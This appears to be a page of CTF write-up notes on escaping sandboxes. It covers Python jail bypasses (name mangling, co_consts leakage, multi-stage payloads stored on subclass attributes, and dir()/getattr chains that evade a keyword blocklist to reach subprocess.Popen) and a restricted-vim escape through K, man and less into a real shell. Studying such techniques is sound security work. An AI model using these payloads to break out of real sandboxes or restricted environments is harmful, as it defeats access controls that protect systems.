<p dir="auto"><strong>1. Name mangling bypass:</strong> Python "private" <code>__method</code> names in a class are stored as <code>_ClassName__method</code>. They are accessible via <code>dir()</code> and <code>getattr()</code> — not truly private.</p>
<div class="highlight highlight-source-python notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="# Name mangling bypass
getattr(obj, dir(obj)[0])()  # calls _ClassName__method"><pre><span class="pl-c"># Name mangling bypass</span>
<span class="pl-en">getattr</span>(<span class="pl-s1">obj</span>, <span class="pl-en">dir</span>(<span class="pl-s1">obj</span>)[<span class="pl-c1">0</span>])()  <span class="pl-c"># calls _ClassName__method</span></pre></div>
<p dir="auto"><strong>2. Function constant leakage:</strong> All string literals inside a function body are stored in <code>func_code.co_consts</code> (Python 2) or <code>__code__.co_consts</code> (Python 3) and are readable from outside.</p>
<div class="highlight highlight-source-python notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="# func_code local variable leak (Python 2)
func.func_code.co_consts  # reveals all string literals in function

# Python 3 equivalent
func.__code__.co_consts"><pre><span class="pl-c"># func_code local variable leak (Python 2)</span>
<span class="pl-s1">func</span>.<span class="pl-c1">func_code</span>.<span class="pl-c1">co_consts</span>  <span class="pl-c"># reveals all string literals in function</span>

<span class="pl-c"># Python 3 equivalent</span>
<span class="pl-s1">func</span>.<span class="pl-c1">__code__</span>.<span class="pl-c1">co_consts</span></pre></div>
<p dir="auto"><strong>3. Module docstring as data store:</strong> Module-level triple-quoted strings become <code>module.__doc__</code>, readable without needing file access.</p>
<div class="highlight highlight-source-python notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="# Module docstring access
import target_module
target_module.__doc__  # reads module-level triple-quoted string"><pre><span class="pl-c"># Module docstring access</span>
<span class="pl-k">import</span> <span class="pl-s1">target_module</span>
<span class="pl-s1">target_module</span>.<span class="pl-c1">__doc__</span>  <span class="pl-c"># reads module-level triple-quoted string</span></pre></div>
<p dir="auto"><strong>Key insight:</strong> Python <code>__</code> prefix is name-mangled, not truly private — <code>dir(obj)</code> + <code>getattr()</code> bypass it. <code>func_code.co_consts</code> exposes all literal constants defined inside a function. Module docstrings are always readable as <code>__doc__</code> without file access.</p>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Multi-Stage Payload with Class Attribute Persistence (PlaidCTF 2013)</h2><a id="user-content-multi-stage-payload-with-class-attribute-persistence-plaidctf-2013" class="anchor" aria-label="Permalink: Multi-Stage Payload with Class Attribute Persistence (PlaidCTF 2013)" href="#multi-stage-payload-with-class-attribute-persistence-plaidctf-2013"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><strong>Pattern:</strong> Store intermediate code fragments across multiple jail submissions by writing to class attributes of subclasses.</p>
<div class="highlight highlight-source-python notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="# Stage 1: Store code fragment on a subclass
().__class__.__base__.__subclasses__()[-2].payload = &quot;import os; os.system('cat /flag.txt')&quot;

# Stage 2 (next submission): Retrieve and execute
exec(().__class__.__base__.__subclasses__()[-2].payload)"><pre><span class="pl-c"># Stage 1: Store code fragment on a subclass</span>
().<span class="pl-c1">__class__</span>.<span class="pl-c1">__base__</span>.<span class="pl-c1">__subclasses__</span>()[<span class="pl-c1">-</span><span class="pl-c1">2</span>].<span class="pl-c1">payload</span> <span class="pl-c1">=</span> <span class="pl-s">"import os; os.system('cat /flag.txt')"</span>

<span class="pl-c"># Stage 2 (next submission): Retrieve and execute</span>
<span class="pl-en">exec</span>(().<span class="pl-c1">__class__</span>.<span class="pl-c1">__base__</span>.<span class="pl-c1">__subclasses__</span>()[<span class="pl-c1">-</span><span class="pl-c1">2</span>].<span class="pl-c1">payload</span>)</pre></div>
<p dir="auto"><strong>Key insight:</strong> Class attributes persist across separate <code>eval()</code>/<code>exec()</code> calls within the same process. If the jail limits input length but allows multiple submissions, split the payload across submissions using subclass attributes as storage. Use <code>IncrementalDecoder</code> or any persistent subclass as the storage target.</p>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Restricted vim Escape via K (man) to :!sh (TokyoWesterns CTF 4th 2018)</h2><a id="user-content-restricted-vim-escape-via-k-man-to-sh-tokyowesterns-ctf-4th-2018" class="anchor" aria-label="Permalink: Restricted vim Escape via K (man) to :!sh (TokyoWesterns CTF 4th 2018)" href="#restricted-vim-escape-via-k-man-to-sh-tokyowesterns-ctf-4th-2018"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><strong>Pattern (shrine):</strong> Sandbox launches a locked-down <code>vim</code> with <code>:shell</code>/<code>:!</code> mapped out and a secure-mode profile. Command-mode escapes are blocked, but normal-mode <code>K</code> (look up keyword under cursor via <code>keywordprg</code>, default <code>man</code>) still works. <code>man</code> internally paginates via <code>less</code>, and <code>less</code> itself has a documented shell-escape: typing <code>!sh</code> from the pager spawns a shell with the user's real privileges.</p>
<p dir="auto"><strong>Exploit steps:</strong></p>
<ol dir="auto">
<li>Open any file in the restricted vim (or create one inline with <code>vim -c 'new' -c 'put! =\"ls\"'</code>).</li>
<li>In normal mode, place the cursor on any identifier and press <code>K</code>. vim runs <code>man &lt;word&gt;</code>.</li>
<li><code>man</code> pipes output to <code>less</code>. Inside <code>less</code>, press <code>!sh</code> and hit Enter — the pager fork/execs a real shell.</li>
<li>Alternatively, once inside <code>less</code> type <code>v</code> to launch <code>$EDITOR</code>; if <code>EDITOR=vim</code> is unset the default editor still allows shell escape via <code>:!</code>.</li>
</ol>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="vim file.txt        # restricted vim opens
(cursor on &quot;ls&quot;)
K                   # runs `man ls` → pager `less`
!sh                 # less shell-escape → real shell"><pre lang="text" class="notranslate"><code>vim file.txt        # restricted vim opens
(cursor on "ls")
K                   # runs `man ls` → pager `less`
!sh                 # less shell-escape → real shell
</code></pre></div>
<p dir="auto"><strong>Hardening signals to check first:</strong> <code>keywordprg</code> value (<code>:set keywordprg?</code>), <code>secure</code> mode, whether <code>shell</code> option has been cleared, and the <code>LESSSECURE=1</code> environment variable. <code>LESSSECURE=1</code> specifically disables <code>!</code>, <code>|</code>, <code>v</code>, and <code>s</code> inside <code>less</code> — its absence is a green light for this escape.</p>
<p dir="auto"><strong>Key insight:</strong> Restricted editors almost always leak via chained pagers and keyword lookups. Catalog every command that spawns a child process (<code>K</code>/<code>keywordprg</code>, <code>:grep</code>, <code>:make</code>, <code>gx</code> for URL open, <code>:Man</code>) before touching <code>:!</code>. If even one child process uses <code>less</code> or another escape-friendly pager without <code>LESSSECURE=1</code>, you have a shell.</p>
<p dir="auto"><strong>References:</strong> TokyoWesterns CTF 4th 2018 — writeup 10859; GTFOBins <code>vim</code>/<code>less</code>/<code>man</code> entries</p>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">dir() Attribute Lookup Escape Bypassing <strong>class</strong> Blocklist (InCTF 2018)</h2><a id="user-content-dir-attribute-lookup-escape-bypassing-class-blocklist-inctf-2018" class="anchor" aria-label="Permalink: dir() Attribute Lookup Escape Bypassing class Blocklist (InCTF 2018)" href="#dir-attribute-lookup-escape-bypassing-class-blocklist-inctf-2018"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><strong>Pattern:</strong> A sandbox substring-filters literal strings <code>__class__</code>, <code>__bases__</code>, <code>__subclasses__</code>, <code>eval</code>, and <code>import</code>, but <code>dir(obj)</code> is allowed and returns the attribute names as strings. Use <code>dir([])</code> to look up forbidden attribute names by index, then chain <code>getattr</code> calls to reach <code>object.__subclasses__()</code> without ever typing the blocked literals.</p>
<div class="highlight highlight-source-python notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="# Blacklist: &quot;__class__&quot;, &quot;__subclasses__&quot;, &quot;eval&quot;, &quot;import&quot;, &quot;exec&quot;
# Allowed: dir(), getattr(), list literals, integer literals

# Step 1: find the index of &quot;__class__&quot; in dir([])
# dir([]) == ['__add__', '__class__', '__contains__', ...]
i_class = 1
base_attr = 34           # index of &quot;__subclasses__&quot; in dir(getattr([], dir([])[1]))

# Step 2: chain getattr with indexed dir() lookups
cls       = getattr([],  dir([])[i_class])           # list.__class__
base      = getattr(cls, dir(cls)[dir(cls).index(&quot;__base__&quot;)])   # object
subs      = getattr(base, dir(base)[base_attr])()    # list of all classes

# Step 3: find a useful class — often subprocess.Popen
for klass in subs:
    if &quot;Popen&quot; in getattr(klass, dir(klass)[dir(klass).index(&quot;__name__&quot;)]):
        break
klass([&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;cat flag&quot;])"><pre><span class="pl-c"># Blacklist: "__class__", "__subclasses__", "eval", "import", "exec"</span>
<span class="pl-c"># Allowed: dir(), getattr(), list literals, integer literals</span>

<span class="pl-c"># Step 1: find the index of "__class__" in dir([])</span>
<span class="pl-c"># dir([]) == ['__add__', '__class__', '__contains__', ...]</span>
<span class="pl-s1">i_class</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span>
<span class="pl-s1">base_attr</span> <span class="pl-c1">=</span> <span class="pl-c1">34</span>           <span class="pl-c"># index of "__subclasses__" in dir(getattr([], dir([])[1]))</span>

<span class="pl-c"># Step 2: chain getattr with indexed dir() lookups</span>
<span class="pl-s1">cls</span>       <span class="pl-c1">=</span> <span class="pl-en">getattr</span>([],  <span class="pl-en">dir</span>([])[<span class="pl-s1">i_class</span>])           <span class="pl-c"># list.__class__</span>
<span class="pl-s1">base</span>      <span class="pl-c1">=</span> <span class="pl-en">getattr</span>(<span class="pl-s1">cls</span>, <span class="pl-en">dir</span>(<span class="pl-s1">cls</span>)[<span class="pl-en">dir</span>(<span class="pl-s1">cls</span>).<span class="pl-c1">index</span>(<span class="pl-s">"__base__"</span>)])   <span class="pl-c"># object</span>
<span class="pl-s1">subs</span>      <span class="pl-c1">=</span> <span class="pl-en">getattr</span>(<span class="pl-s1">base</span>, <span class="pl-en">dir</span>(<span class="pl-s1">base</span>)[<span class="pl-s1">base_attr</span>])()    <span class="pl-c"># list of all classes</span>

<span class="pl-c"># Step 3: find a useful class — often subprocess.Popen</span>
<span class="pl-k">for</span> <span class="pl-s1">klass</span> <span class="pl-c1">in</span> <span class="pl-s1">subs</span>:
    <span class="pl-k">if</span> <span class="pl-s">"Popen"</span> <span class="pl-c1">in</span> <span class="pl-en">getattr</span>(<span class="pl-s1">klass</span>, <span class="pl-en">dir</span>(<span class="pl-s1">klass</span>)[<span class="pl-en">dir</span>(<span class="pl-s1">klass</span>).<span class="pl-c1">index</span>(<span class="pl-s">"__name__"</span>)]):
        <span class="pl-k">break</span>
<span class="pl-en">klass</span>([<span class="pl-s">"/bin/sh"</span>, <span class="pl-s">"-c"</span>, <span class="pl-s">"cat flag"</span>])</pre></div>
<p dir="auto"><strong>Key insight:</strong> <code>dir()</code> is a <em>data</em> function: it returns plain strings. A substring blocklist scanning the source never sees the blocked words because they are generated at runtime from attribute table bytes. Any Python jail that filters source text without AST walking is defeated by one layer of indirection — <code>dir</code>, <code>globals().get(key)</code>, or <code>vars(obj)[key]</code>. When auditing a jail, always ask: "does the filter see the literal or the <em>value</em>?". If it only sees the literal, <code>dir()</code> indexing is the shortest escape.</p>
<p dir="auto"><strong>References:</strong> InCTF 2018 — The Most Secure File Uploader, writeup 11528</p>
